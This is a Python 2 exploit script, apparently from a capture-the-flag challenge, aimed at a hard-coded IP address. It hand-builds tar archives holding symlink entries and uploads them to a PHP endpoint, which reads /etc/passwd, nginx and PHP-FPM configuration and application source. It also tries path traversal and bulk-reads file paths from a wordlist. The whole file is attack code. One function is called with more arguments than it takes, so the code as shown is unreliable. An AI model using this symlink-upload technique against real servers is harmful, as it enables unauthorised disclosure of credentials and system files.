#!/usr/bin/env python2
# coding=utf-8

import os
import sys
import re
import requests as req
import urllib2


URL = 'http://54.223.177.152/6c58c8751bca32b9943b34d0ff29bc16/index.php'

HEADERS = {
    'Origin': 'http://54.223.177.152',
    'User-Agent': 'Mozilla/5.0 AppleWebKit/537.75.14 (KHTML, like Gecko) Safari'
}


def _tarfile(content_name, linkname):
    if len(content_name) > 100:
        print 'content_name error'
        return False
    content_data = b''
    t_name = content_name + b'\x00' * (100 - len(content_name))
    t_linkname = linkname + b'\x00' * (100 - len(linkname))
    t_block = content_data + b'\x00' * (512 - len(content_data))
    _a = t_name + b'0000664\x000001750\x000001750\x0000000000000\x0001274124644\x00'
    _b = b'2' + t_linkname + b'ustar\x32\x32\x00' + \
        (b'root' + b'\x00' * 28) * 2 + b'\x00' * 199
    _t = _a + _b
    _sum = 0
    for j in str(_t):
        _sum += ord(j)
    t_chksum = b'0' * (8 - len(bytes(oct(_sum + 256)))) + \
        bytes(oct(_sum + 256))
    return bytearray(_a + t_chksum + _b + t_block + b'\x00' * 512)


def exp_1():
    _req = urllib2.Request(
        'http://54.223.177.152/upload\x20/../pwnhub/index.html')
    res = urllib2.urlopen(_req)
    print res.read()
    res.close()


def upload_file(filename, filedata):
    files = {
        "upload": (filename, filedata, 'application/x-tar'),
    }
    res = req.post(URL, files=files, headers=HEADERS, timeout=5)
    if res.status_code == 200:
        return res.content
    else:
        return False


def exp_2(fn=b'v.cfg', ln=b'/etc/passwd'):
    fd = _tarfile(fn, b'', ln)
    res = upload_file('v.tar', fd)
    if res:
        m = re.findall(
            r'<textarea cols="30" rows="15">(.*)</textarea>', res, re.M | re.S)
        if m:
            return m[0]
        else:
            return res
    else:
        return False


def load_dict(fn):
    res = []
    with open(fn, 'r') as f:
        res = f.readlines()
    return res


def ssrf():
    dicts = load_dict('./../vFuckingTools/dict/ssrf/ssrf.dic')
    for i in dicts:
        if '#' in i:
            continue
        fn = i.replace('\n', '')
        print fn
        try:
            r = exp_2(b'x.cfg', bytes(fn))
            if r:
                with open('./tmp/' + fn.replace('/', '_').replace(' ', '_'), 'w') as f:
                    f.write(r)
        except:
            pass


def input_dir():
    raw = raw_input('> ')
    while raw:
        print exp_2(b'x.cfg', bytes(raw))
        raw = raw_input('> ')

if __name__ == '__main__':
    # ssrf()
    # print exp_2(b'x.cfg', bytes('/usr/local/nginx/html/index.html'))
    # print exp_2(b'x.cfg', bytes('/etc/hosts'))
    # print exp_2(b'x.cfg', bytes('/usr/local/nginx/conf/nginx.conf'))
    # print exp_2(b'x.cfg', bytes('/home/jdoajdoiq/jdijiqjwi/jiqji12i3198uax192/cron_run.sh'))
    # print exp_2(b'x.cfg',
    # bytes('/home/jdoajdoiq/jdijiqjwi/jiqji12i3198uax192/run/run.py'))
    # print exp_2(b'x.cfg', bytes('/etc/php5/fpm/pool.d/www.conf'))
    print exp_2(b'x.cfg', bytes('/home/jdoajdoiq/jdijiqjwi/jiqji12i3198uax192/run/mail_send.py'))
    # if len(sys.argv) > 0:
    #     if sys.argv[1] == 'dir':
    #         input_dir()
    #     if sys.argv[1] == 'save':
    #         print exp_2(b'x.cfg', bytes(sys.argv[2]))
